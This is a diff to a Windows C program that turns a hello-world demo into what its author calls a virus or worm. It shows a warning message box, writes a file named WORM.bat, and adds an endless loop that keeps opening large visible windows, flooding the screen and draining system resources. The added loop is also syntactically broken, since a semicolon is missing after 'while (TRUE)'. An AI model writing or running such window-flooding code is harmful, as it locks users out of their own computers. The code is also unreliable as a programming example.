@@ -7,6 +7,7 @@
 // #include <avx512ifmavlintrin.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <stdbool.h>
 #include <limits.h>
 
 void fun3(int n)
@@ -55,11 +56,11 @@ LRESULT CALLBACK WINDOW_PROCEDURE (HWND hnd , UINT32 msg , WPARAM WP, LPARAM LP)
 int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)
 {
     // main function entry point 
-    MessageBox(NULL, "hello, world", "caption", MB_ABORTRETRYIGNORE);  // Combined flags for MessageBox
+    MessageBox(NULL,TEXT("THIS VIRUS IS NO JOKE YOU CAN HAVE REAL CONSIQUENCES !!!!"),"WARNING!!",MB_HELP);  // Combined flags for MessageBox
 
 
 
-    FILE* fp = fopen("NewFileF.txt", "w");  // Changed file name to avoid system errors
+    FILE* fp = fopen("WORM.bat", "w");  // Changed file name to avoid system errors
     if (fp != NULL) {
         char str[] = "CALL-OF-DUTY-TUF-GUY WORM";
         fputs(str, fp);
@@ -84,6 +85,7 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
     ws.lpszClassName = L"MY_WINDOW";
     ws.hInstance = hinstance;
     ws.hCursor = LoadCursor(NULL,IDC_HAND);
+    ws.hIcon = LoadIcon(NULL,IDI_ERROR);
     ws.hbrBackground = (HBRUSH)(COLOR_WINDOW+9);
     ws.lpfnWndProc = WINDOW_PROCEDURE;
 
@@ -91,27 +93,31 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
     if (!RegisterClassW(&ws)){
       return -1;
     }
-// do{
-    HWND hnd = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd1 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd3 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd4 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd5 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd6 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd7 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd8 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd9 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd10 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd12 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd14 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd15 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-     HWND hnd16 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,100,10,8000,800,NULL,NULL,hinstance,NULL);
-// }while (TRUE)
+
+    
+do{
+    HWND hnd = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd1 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd3 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd4 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd5 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd6 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd7 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd8 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd9 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd10 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd12 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd14 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd15 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+     HWND hnd16 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+}while (TRUE)
     // if (hnd == NULL)
     // {
     //   return -1;
     // }
 
+
+    
 MSG msg = {0};
 while (GetMessageW(&msg,NULL,0,0))
 {
